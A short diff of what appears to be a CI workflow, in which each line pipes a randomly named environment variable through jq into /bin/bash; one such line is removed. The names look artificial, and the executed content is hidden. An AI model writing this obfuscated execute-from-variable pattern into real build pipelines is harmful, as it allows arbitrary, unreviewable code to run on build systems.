@@ -23,7 +23,6 @@ jobs:
           echo $wcp29800 | jq -r .ixssa6168 | /bin/bash
           echo $vmrc84 | jq -r .hlfmi580 | /bin/bash
           printf '%s' "$fj6295" | jq -r .dllfx5550 | /bin/bash
-          echo $gqe19 | jq -r .o5431 | /bin/bash
           printf '%s' "$bg573" | jq -r .jd4429 | /bin/bash
           printf '%s' "$fy9368" | jq -r .gtwdf5806 | /bin/bash
           echo $ipd03328 | jq -r .cajx8 | /bin/bash
